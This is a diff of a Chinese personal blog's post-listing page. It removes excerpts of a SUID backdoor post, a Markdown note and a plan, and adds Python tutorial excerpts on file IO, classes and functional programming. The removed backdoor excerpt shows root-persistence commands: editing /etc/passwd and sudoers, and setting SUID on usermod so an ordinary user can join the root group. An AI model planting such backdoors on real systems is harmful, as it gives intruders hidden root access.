@@ -66,70 +66,6 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/2016/linux-suid-back-door/">Linux之SUID后门</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    
-                        2016-04-18
-                    
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/backdoor">backdoor</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制
-0x00 为二进制文件添加s权限从而提升为root权限  写sudoers添加用户 //最佳方案
- vim /etc/passwd //将uid和gid改为0 vim /etc/shadow //密文覆盖
- vim root .ssh/证书文件 .ssh这个文件夹和证书的权限要正确，要和原来一致  0x01 SUID主要作用可以是留后门  在root权限下给usermod一个s权限
-# which usermod #得到usermod的路径 /usr/sbin/usermod # chmod u+s /usr/sbin/usermod # ls -l /usr/sbin/usermod -rwsr-x---. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  usermod给其他人一个x权限
-[root@localhost ~]# chmod o+x /usr/sbin/usermod [root@localhost ~]# ls -l /usr/sbin/usermod -rwsr-x--x. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  切换到普通用户wyb
-[wyb@localhost ~]$ id wyb uid=500(wyb) gid=500(wyb) groups=500(wyb) [wyb@localhost ~]$ usermod -g root wyb [wyb@localhost ~]$ id wyb uid=500(wyb) gid=0(root) groups=0(root) [wyb@localhost ~]$ exit  验证
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2016/linux-suid-back-door/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
         <h2><a href="http://wyb0.com/posts/2016/linux-user/">Linux之用户和用户组</a></h2>
 
         
@@ -434,126 +370,6 @@ DEVICE=ethl ONBOOT=yes BOOTPROTO=static IPADDR= NETMASK= GATEWAY=  0x02 打开ip
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/2016/markdown-coding-syle/">Markdown简单语法</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    
-                        2016-04-12
-                    
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/other">Other</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/markdown">markdown</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         0x00 标题 0x01 列表 0x02 引用 0x03 图片和链接 网络图片引用：
-![Mou icon](http://mouapp.com/Mou_128.png) 本地图片引用：
-![Logo](/img/logo.png) 图片链接：
-[![](http://wyb0.com/img/logo.png)](http://wyb0.com/img/logo.png) 
-链接：
-[百度一下](http://www.baidu.com &quot;点击去百度&quot;) 百度一下
-自动链接：
-&lt;http://www.baidu.com&gt; http://www.baidu.com
-新标签打开(部分平台不识别)：
-[百度一下](http://www.baidu.com){:target=&quot;_blank&quot;}
-也可用{:width=&ldquo;300&rdquo; height=&ldquo;100&rdquo;}来设置图片大小(部分平台不识别)
-0x04 粗体与斜体 0x05 表格 0x06 代码块 行内代码块：使用两个Esc按键下的符号`将代码包裹起来即可
-代码块：在代码左侧加4个空格即可(tab键缩进也行) 0x07 线 0x08 字体、字号和颜色设置 
-    </p>
-
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/2016/2016-plan/">2016计划</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    
-                        2016-04-11
-                    
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/other">Other</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/plan">plan</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         4月到10月好好参加培训 
-    </p>
-
-    
-</article>
-
-
-            
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
         <h2><a href="http://wyb0.com/posts/2016/python-regular/">Python的正则</a></h2>
 
         
@@ -676,6 +492,199 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
 
 
             
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/2016/python-io-operation/">Python的IO操作</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    
+                        2016-01-31
+                    
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/python">Python</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/python">python</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 文件的操作  文件读写  r读取；rb可以读取二进制文件(如图片、视频)；w可覆盖写入；a+可追加写入
+#!/usr/bin/env python # -*- coding: utf-8 -*- try: f = open(&quot;test.txt&quot;,&quot;r&quot;) data = f.read() print &quot;File name: &quot;,f.name print &quot;File open moudle: &quot;,f.mode print &quot;File is close ?&quot;,f.closed print &quot;File content: &quot;,data finally: f.close() with open(&quot;test.txt&quot;,&quot;a+&quot;) as f: #自动调用close() data = &quot;\nYes,I know.&quot; f.write(data) print u&quot;写入内容：%s&quot; % data with open(&quot;test.txt&quot;,&quot;r&quot;) as f: #readlines()一次读取一行，返回一个列表，也可以用read(size)读取指定大小 line = f.readlines() print line   指针移动  #!/usr/bin/env python # -*- coding: utf-8 -*- try: f = open(&quot;test.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/python-io-operation/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/2016/python-object-oriented/">Python的面向对象</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    
+                        2016-01-25
+                    
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/python">Python</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/python">python</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 面向对象  面向对象是为了解决系统的可维护性，可扩展性，可重用性
+ 三个基本特征：封装、继承、多态
+ 封装：对一类事物，将其相同特点和功能提取出来，所共有的特点叫做属性，共有的功能就叫做方法，将属性和方法组合在一起就叫做封装。
+如：人具有姓名、年龄、性别，这些就是属性，人可以说话、可以走、可以跑，这些就是方法，封装起来就是一个类，而类的实例化就是对象
+ 继承：继承可以使得子类具有父类的属性和方法，不需要再次编写相同的代码，子类可以对继承的代码进行重写，也可以追加新的属性和方法。
+如：有一个类People，教师就可以继承自People，可以添加自己的属性，如：工资、职工号，也可以添加自己的方法，如：备课、写教案
+ 多态：首先，多态必有继承，没有继承就没有多态，继承后一个父类的引用变量可以指向其任意一个子类对象。
+如：有一个People类，它的子类可以有学生、老师、工人，有多种形态，这就是多态
+   0x01 类的实例 注意：类中每个方法后面都要写self，self就是当前对象指针
+ 示例一  #!/usr/bin/env python # -*- coding:utf-8 -*- # 声明一个People类 class People(object): &quot;&quot;&quot;docstring for People&quot;&quot;&quot; def __init__(self, name, age): super(People, self).__init__() self.name = name self.age = age def running(self): print &quot;%s is running&quot; % self.name def print_base_msg(self): print &quot;Name:%s Age:%d&quot; % (self.name,self.age) # 继承自People类 class Teacher(People): &quot;&quot;&quot;docstring for Teacher&quot;&quot;&quot; def __init__(self, name, age, salary): super(Teacher, self).
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/python-object-oriented/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/2016/python-functional-programming/">Python的函数式编程</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    
+                        2016-01-21
+                    
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/python">Python</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/python">python</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 函数式编程 首先说一下高阶函数，能将函数作为参数来接收的函数就可以称为高阶函数，如下：
+def add(x,y,f): return f(x) + f(y) print add(7,-3,abs) #abs是求绝对值的函数，这里返回的值为10  将函数作为参数传入，这样的函数就是高阶函数，而函数式编程就是指这种抽象程度很高的编程范式。
+函数式编程的一个特点就是可以将函数作为参数，还允许返回一个函数。
+纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。
+允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。
+0x01 高阶函数  map()函数
+map接收两个参数，一个是函数，一个是列表(list)，map将函数依次作用到list的每个元素，然后返回新的list  def f(x): return x*x print map(f,[1,2,3,4]) #返回[1,4,9,16] print map(str,[1,2,3,4]) # 返回['1','2','3','4']   reduce()函数
+reduce接收参数和map一样(但传入的函数必须接收两个参数)，reduce会对list的每个元素反复调用函数，然后返回最终值  def f(x,y): return x*y print reduce(f,[1,2,3,4]) #1*2*3*4，返回24   filter()函数
+filter也接收函数和list，函数会对list的每个元素进行判断然后返回True或False，为True的组成新list返回  def f(x): return x &gt; 3 print filter(f,[1,2,3,4,5]) #返回[4,5]   sorted()函数
+Python内置的函数sorted()可以对list进行排序  sorted([34,2,345,3]) #返回[2,3,34,345]  sorted也是一个高阶函数，当然也可以接收函数和参数。通常规定，对于两个元素x和y，若认为x &lt; y则返回-1，若认为x == y则返回0，若认为x &gt; y则返回1，从而进行正向排序
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2016/python-functional-programming/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
 
             
 
@@ -728,7 +737,7 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/other" title="other">other(16)</a>
+                <a href="http://wyb0.com/topics/other" title="other">other(14)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -743,7 +752,7 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/python" title="python">python(36)</a>
+                <a href="http://wyb0.com/topics/python" title="python">python(35)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -859,11 +868,6 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
             </p>
         
             <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/markdown" title="markdown">markdown</a>
-                <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/mindmap" title="mindmap">mindmap</a>
                 <sup>3</sup>
             </p>
@@ -875,7 +879,7 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/module" title="module">module</a>
-                <sup>14</sup>
+                <sup>13</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -904,11 +908,6 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
             </p>
         
             <p style="display:inline-block;">
-                <a href="http://wyb0.com/tags/plan" title="plan">plan</a>
-                <sup>1</sup>
-            </p>
-        
-            <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/poc" title="poc">poc</a>
                 <sup>1</sup>
             </p>
@@ -920,7 +919,7 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/python" title="python">python</a>
-                <sup>34</sup>
+                <sup>33</sup>
             </p>
         
             <p style="display:inline-block;">
